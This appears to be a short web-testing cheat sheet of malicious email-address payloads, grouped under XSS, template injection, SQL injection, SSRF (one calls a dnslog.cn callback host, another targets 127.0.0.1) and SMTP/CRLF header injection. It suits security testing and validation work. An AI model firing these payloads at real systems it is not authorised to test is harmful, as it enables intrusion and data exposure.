	XSS
	test+(<script>alert(0)</script>)@example.com
	test@example(<script>alert(0)</script>).com
	"<script>alert(0)</script>"@example.com
	SSTI
	"<%= 7 * 7 %>"@example.com
	test+(${{7*7}})@example.com
	SQL injection
	"' OR 1=1 -- '"@example.com 
	"mail'); --"@example.com
	SSRF
	john.doe@abc123.dnslog.cn
	john.doe@[127.0.0.1]
	头注入
	"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
	"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
